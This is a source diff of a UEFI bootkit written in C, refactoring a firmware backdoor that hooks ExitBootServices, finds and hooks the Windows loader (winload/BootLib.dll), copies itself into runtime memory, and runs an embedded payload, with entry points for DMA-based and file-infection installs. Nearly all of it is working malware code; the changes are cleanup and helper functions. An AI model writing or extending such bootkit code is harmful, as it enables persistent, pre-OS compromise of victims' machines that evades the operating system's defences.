@@ -41,8 +41,6 @@
 
 #pragma section(".conf", read, write)
 
-#define MAX_IMAGE_SIZE (1 * 1024 * 1024)
-
 EFI_STATUS 
 EFIAPI
 _ModuleEntryPoint(
@@ -104,35 +102,37 @@ BOOLEAN m_bReportStatus = FALSE;
 VOID *m_Payload = NULL;
 UINT32 m_PayloadSize = 0;
 //--------------------------------------------------------------------------------------
-void ConsolePrintScreen(char *Message)
-{    
+VOID ConsolePrintScreen(char *Message)
+{
     if (m_TextOutput)
-    {        
+    {
         size_t Len = std_strlen(Message), i = 0;
 
         for (i = 0; i < Len; i += 1)
         {    
-            CHAR16 Char[2];        
+            CHAR16 Char[2];
 
             Char[0] = (CHAR16)Message[i];
             Char[1] = 0;
 
+            // print UTF-16 byte on the screen
             m_TextOutput->OutputString(m_TextOutput, Char);
         }
     }
 }
 
-void ConsolePrintBuffer(char *Message)
+VOID ConsolePrintBuffer(char *Message)
 {
     size_t Len = std_strlen(Message);
 
     if (m_PendingOutput && std_strlen(m_PendingOutput) + Len < DEBUG_OUTPUT_SIZE)
-    {                    
+    {
+        // append message to the buffer
         strcat(m_PendingOutput, Message);
     }
 }
 
-void ConsolePrint(char *Message)
+VOID ConsolePrint(char *Message)
 {
     // print messages to the screem
     ConsolePrintScreen(Message);
@@ -141,10 +141,10 @@ void ConsolePrint(char *Message)
     ConsolePrintBuffer(Message);
 }
 //--------------------------------------------------------------------------------------
-void ConsoleInitialize(void)
+VOID ConsoleInitialize(VOID)
 {
     EFI_STATUS Status = EFI_SUCCESS;
-    EFI_PHYSICAL_ADDRESS PagesAddr;
+    EFI_PHYSICAL_ADDRESS PagesAddr = 0;
 
 #if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
 
@@ -161,7 +161,7 @@ void ConsoleInitialize(void)
 
 #endif
 
-    // allocate memory for debug output
+    // allocate runtime memory for the debug output
     Status = m_BS->AllocatePages(
         AllocateAnyPages, EfiRuntimeServicesData, 
         (DEBUG_OUTPUT_SIZE / PAGE_SIZE), &PagesAddr
@@ -172,10 +172,12 @@ void ConsoleInitialize(void)
 
         if (m_bReportStatus)
         {
+            // save buffer address to the physical memory
             *m_PendingOutputAddr = PagesAddr;
         }
 
-        m_PendingOutput = (char *)PagesAddr;        
+        // initialize the buffer
+        m_PendingOutput = (char *)PagesAddr;
         std_memset(m_PendingOutput, 0, DEBUG_OUTPUT_SIZE);
 
         // save memory address into the firmware variable
@@ -190,9 +192,15 @@ void ConsoleInitialize(void)
         }
     }
     else
-    {     
+    {
         DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
     }
+}
+
+VOID ConsoleDisable(VOID)
+{
+    // don't print anything to the console
+    m_TextOutput = NULL;
 }
 //--------------------------------------------------------------------------------------
 VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
@@ -203,8 +211,7 @@ VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
     {
         // initialize console I/O
         Status = m_BS->HandleProtocol(
-            m_ST->ConsoleOutHandle,
-            &gEfiSimpleTextOutProtocolGuid, 
+            m_ST->ConsoleOutHandle, &gEfiSimpleTextOutProtocolGuid, 
             (VOID **)&m_TextOutput
         );
         if (Status == EFI_SUCCESS)
@@ -213,78 +220,89 @@ VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
             m_TextOutput->ClearScreen(m_TextOutput);
 
             DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Text output protocol is ready\r\n");
-            
+
             if (m_PendingOutput)
-            {                
+            {
                 // print pending messages
                 ConsolePrintScreen(m_PendingOutput);
 
 #if !defined(BACKDOOR_DEBUG_SCREEN)
 
-                m_TextOutput = NULL;
+                // on screen messages are disabled
+                ConsoleDisable();
 #endif
                 m_BS->Stall(TO_MICROSECONDS(3));
-            }            
-        }        
-    }        
+            }
+        }
+    }
 }
 //--------------------------------------------------------------------------------------
-VOID *ImageBaseByAddress(VOID *Addr)
+#define MAX_IMAGE_SIZE (1 * 1024 * 1024)
+
+BOOLEAN ImageBaseCheck(VOID *Addr)
 {
-    UINTN Offset = 0;
-    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    
+    EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Addr;
+
+    // check for DOS header
+    if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
+        pDosHdr->e_lfanew < PAGE_SIZE)
+    {
+        EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Addr, pDosHdr->e_lfanew);
+
+        // check for NT header
+        if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
+        {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+VOID *ImageBaseByAddress(VOID *Addr, UINTN Align)
+{
+    UINT64 Offset = 0;
 
     // get current module base by address inside of it
     while (Offset < MAX_IMAGE_SIZE)
-    {       
-        EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Base; 
+    {
+        VOID *Base = (VOID *)(ALIGN_DOWN((UINT64)Addr, Align) - Offset);
 
-        // check for DOS header
-        if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
-            pDosHdr->e_lfanew < 0x100)
+        // check for valid image header
+        if (ImageBaseCheck(Base))
         {
-            EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, pDosHdr->e_lfanew);
-
-            // check for NT header
-            if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
-            {
-                return Base;
-            }
+            return Base;
         }
 
-        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
-        Offset += DEFAULT_EDK_ALIGN;
+        Offset += Align;
     }
 
-    // unable to locate PE/TE header
     return NULL;
 }
 //--------------------------------------------------------------------------------------
-VOID *BackdoorImageRealocate(VOID *Image)
+VOID *ImageRealocate(VOID *Image)
 {
     EFI_STATUS Status = EFI_SUCCESS;
+    EFI_PHYSICAL_ADDRESS PagesAddr = 0;
 
     EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
-        Image, 
-        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
-    );
-    
-    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
-    EFI_PHYSICAL_ADDRESS Addr = 0;      
+        Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);
 
-    DbgMsg(
-        __FILE__, __LINE__, __FUNCTION__"(): image size = 0x%x\r\n", 
-        pHeaders->OptionalHeader.SizeOfImage
-    );  
+    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
 
     // allocate memory for executable image
-    Status = m_BS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, PagesCount, &Addr);
+    Status = m_BS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, PagesCount, &PagesAddr);
     if (Status == EFI_SUCCESS)
-    {     
-        VOID *Realocated = (VOID *)Addr;
+    {
+        VOID *Realocated = (VOID *)PagesAddr;
+
+        DbgMsg(
+            __FILE__, __LINE__, "%d runtime memory pages was allocated at "FPTR"\r\n",
+            PagesCount, Realocated
+        );
 
         // copy image to the new location
-        std_memcpy(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 
+        std_memcpy(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage);
 
         // update image relocations acording to the new address
         LDR_UPDATE_RELOCS(Realocated, Image, Realocated);
@@ -293,9 +311,9 @@ VOID *BackdoorImageRealocate(VOID *Image)
     }
     else
     {
-        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
+        DbgMsg(__FILE__, __LINE__, "AllocatePages() ERROR 0x%x\r\n", Status);
     }
- 
+
     return NULL;
 }
 //--------------------------------------------------------------------------------------
@@ -305,26 +323,10 @@ EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
 // return address to ExitBootServices() caller
 UINT64 ret_ExitBootServices = 0;
 
-VOID *FindWinloadImage(UINT64 Addr)
+VOID *WinloadFindImage(VOID *ReturnAddr)
 {
-    VOID *Image = NULL;
-    UINT64 Size = 0;
-
-    // align by page boundary
-    Addr &= ~(PAGE_SIZE - 1);
-
-    // determinate winload.dll base address
-    for (Size = 0; Size < MAX_IMAGE_SIZE && Addr > 0; Size += 1)
-    {
-        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
-        {
-            Image = (VOID *)Addr;
-            break;
-        }
-
-        Addr -= PAGE_SIZE;
-    }   
-
+    // get image base address
+    VOID *Image = ImageBaseByAddress(ReturnAddr, PAGE_SIZE);
     if (Image)
     {
         EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
@@ -334,7 +336,7 @@ VOID *FindWinloadImage(UINT64 Addr)
         UINT32 ExportAddr = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
         if (ExportAddr != 0)
         {                    
-            EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
+            EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);
 
             // check winload image name
             if (std_strcmp((char *)RVATOVA(Image, Export->Name), "BootLib.dll") == 0 ||
@@ -352,18 +354,18 @@ VOID *FindWinloadImage(UINT64 Addr)
 EFI_STATUS EFIAPI new_ExitBootServices(
     EFI_HANDLE ImageHandle,
     UINTN Key)
-{    
+{
     PBACKDOOR_INFO pBackdoorInfo = (PBACKDOOR_INFO)(BACKDOOR_INFO_ADDR);
 
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() called\r\n");    
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() called\r\n");
 
     if (m_WinloadBase == NULL)
-    {        
+    {
         VOID *WinloadBase = NULL;
 
         // chcek if OpenProtocol() was called from the winload image
-        if ((WinloadBase = FindWinloadImage(ret_ExitBootServices)) != NULL)
-        {            
+        if ((WinloadBase = WinloadFindImage((VOID *)ret_ExitBootServices)) != NULL)
+        {
             // set up winload hooks
             WinloadHook(WinloadBase);
 
@@ -394,8 +396,8 @@ EFI_STATUS EFIAPI new_ExitBootServices(
         break;
     }
 
-    // prevent to call DXE services during runtime phase
-    m_TextOutput = NULL;
+    // prevent to call console I/O ervices during runtime phase
+    ConsoleDisable();
 
     if (m_bReportStatus)
     {
@@ -414,14 +416,14 @@ EFI_STATUS RegisterProtocolNotifyDxe(
     EFI_EVENT *Event, VOID **Registration)
 {
     EFI_STATUS Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
-    if (EFI_ERROR(Status)) 
+    if (EFI_ERROR(Status))
     {
         DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
         return Status;
     }
 
     Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration);
-    if (EFI_ERROR(Status)) 
+    if (EFI_ERROR(Status))
     {
         DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
         return Status;
@@ -433,9 +435,9 @@ EFI_STATUS RegisterProtocolNotifyDxe(
 }
 
 VOID BackdoorEntryResident(VOID *Image)
-{               
+{
     PBACKDOOR_INFO pBackdoorInfo = (PBACKDOOR_INFO)(BACKDOOR_INFO_ADDR);
-    PINFECTOR_STATUS pInfectorStatus = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);    
+    PINFECTOR_STATUS pInfectorStatus = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);
 
 #if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
 
@@ -450,7 +452,7 @@ VOID BackdoorEntryResident(VOID *Image)
 
 #endif
 
-    m_ImageBase = Image;        
+    m_ImageBase = Image;
 
     DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");
 
@@ -463,13 +465,13 @@ VOID BackdoorEntryResident(VOID *Image)
         DbgMsg(
             __FILE__, __LINE__, "ExitBootServices() hook was set, handler = "FPTR"\r\n",
             _ExitBootServices
-        );    
+        );
 
         m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_IMAGE;
     }
     else
     {
-        m_BackdoorInfo.Status = BACKDOOR_ERR_UNKNOWN;    
+        m_BackdoorInfo.Status = BACKDOOR_ERR_UNKNOWN;
     }
     
     m_BackdoorInfo.ImageBase = NULL;
@@ -486,7 +488,8 @@ VOID BackdoorEntryResident(VOID *Image)
 
 #if !defined(BACKDOOR_DEBUG_SCREEN)
 
-    m_TextOutput = NULL;
+    // on screen messages are disabled
+    ConsoleDisable();
 
 #endif
 
@@ -523,7 +526,7 @@ EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID 
     EFI_SYSTEM_TABLE *SystemTable = NULL;
 
     // get backdoor image base address
-    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
+    if ((Base = ImageBaseByAddress(get_addr(), DEFAULT_EDK_ALIGN)) == NULL)
     {
         return EFI_SUCCESS;
     }
@@ -531,14 +534,14 @@ EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID 
     // setup correct image relocations
     if (!LdrProcessRelocs(Base, Base))
     {
-        return EFI_SUCCESS;   
-    }    
+        return EFI_SUCCESS;
+    }
 
-    m_ImageBase = Base;  
+    m_ImageBase = Base;
     m_bReportStatus = TRUE;
 
     LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
-    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    
+    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;
 
     if (LocateProtocol != NULL)
     {
@@ -555,7 +558,7 @@ EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID 
     if (SystemTable != NULL)
     {
         // call real entry point
-        _ModuleEntryPoint(NULL, SystemTable);    
+        _ModuleEntryPoint(NULL, SystemTable);
     }
 
     if (LocateProtocol != NULL)
@@ -573,7 +576,7 @@ EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE
     EFI_LOADED_IMAGE *LoadedImage = NULL;
 
     // get backdoor image base address
-    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
+    if ((Base = ImageBaseByAddress(get_addr(), DEFAULT_EDK_ALIGN)) == NULL)
     {
         return EFI_SUCCESS;
     }
@@ -581,16 +584,16 @@ EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE
     // setup correct image relocations
     if (!LdrProcessRelocs(Base, Base))
     {
-        return EFI_SUCCESS;   
-    }    
+        return EFI_SUCCESS;
+    }
 
-    m_ImageBase = Base;  
+    m_ImageBase = Base;
     
     // call real entry point
     _ModuleEntryPoint(NULL, SystemTable);
 
     // get current image information
-    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  
+    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);
 
     if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
     {
@@ -610,10 +613,10 @@ EFI_STATUS
 EFIAPI
 _ModuleEntryPoint(
     EFI_HANDLE ImageHandle,
-    EFI_SYSTEM_TABLE *SystemTable) 
-{    
-    m_ST = SystemTable;    
-    m_BS = SystemTable->BootServices;    
+    EFI_SYSTEM_TABLE *SystemTable)
+{
+    m_ST = SystemTable;
+    m_BS = SystemTable->BootServices;
     m_RT = SystemTable->RuntimeServices;
 
 #if defined(BACKDOOR_DEBUG)
@@ -636,13 +639,13 @@ _ModuleEntryPoint(
 #endif
 
     if (m_ImageBase == NULL)
-    {   
+    {
         if (ImageHandle)
-        {     
+        {
             EFI_LOADED_IMAGE *LoadedImage = NULL;
 
             // bootkit was loaded as EFI application
-            EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
+            EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);
             if (Status == EFI_SUCCESS)
             {
                 // get current image base
@@ -656,7 +659,7 @@ _ModuleEntryPoint(
         else
         {
             // get backdoor image base address
-            m_ImageBase = ImageBaseByAddress(get_addr());
+            m_ImageBase = ImageBaseByAddress(get_addr(), DEFAULT_EDK_ALIGN);
         }
     }
 
@@ -670,9 +673,9 @@ _ModuleEntryPoint(
         // check if we have any payload to execute
         if (pPayload->Offset != 0 && pPayload->Size != 0)
         {
-            EFI_STATUS Status = 0;     
+            EFI_STATUS Status = 0;
             EFI_PHYSICAL_ADDRESS Addr = 0;
-            UINTN PagesCount = (pPayload->Size / PAGE_SIZE) + 1;        
+            UINTN PagesCount = (pPayload->Size / PAGE_SIZE) + 1;
 
             DbgMsg(__FILE__, __LINE__, "Payload size is %d bytes\r\n", pPayload->Size);
 
@@ -684,7 +687,7 @@ _ModuleEntryPoint(
                 &Addr
             );
             if (Status == EFI_SUCCESS)
-            {     
+            {
                 VOID *Payload = RVATOVA(m_ImageBase, pPayload->Offset);
 
                 m_Payload = (VOID *)Addr;
@@ -711,19 +714,19 @@ _ModuleEntryPoint(
             DbgMsg(__FILE__, __LINE__, "Payload is not present\r\n");
         }
 
+        DbgMsg(__FILE__, __LINE__, "Current image address is "FPTR"\r\n", m_ImageBase);
+
         // copy image to the new location
-        if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
+        if ((Image = ImageRealocate(m_ImageBase)) != NULL)
         {
             BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
-                Image,
-                (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
-            );
+                Image, (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase);
             
-            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
+            DbgMsg(__FILE__, __LINE__, "Resident code entry point is "FPTR"\r\n", pEntry);
             
             // initialize backdoor resident code
             pEntry(Image);
-        } 
+        }
     }
 
 #if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
